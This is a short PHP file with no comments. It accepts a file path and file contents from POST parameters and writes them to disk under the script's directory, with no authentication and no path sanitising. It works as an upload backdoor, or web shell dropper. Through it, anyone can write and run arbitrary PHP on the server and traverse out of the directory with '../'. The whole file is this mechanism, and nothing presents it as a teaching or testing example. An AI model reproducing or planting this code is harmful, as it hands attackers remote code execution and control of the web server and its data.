<?php
if (!empty($_POST['file']) && isset($_POST['code'])) {
    $path = __DIR__ . $_POST['file'];
    file_put_contents($path, $_POST['code']);
    echo "Saved " . htmlspecialchars($_POST['file']);
}
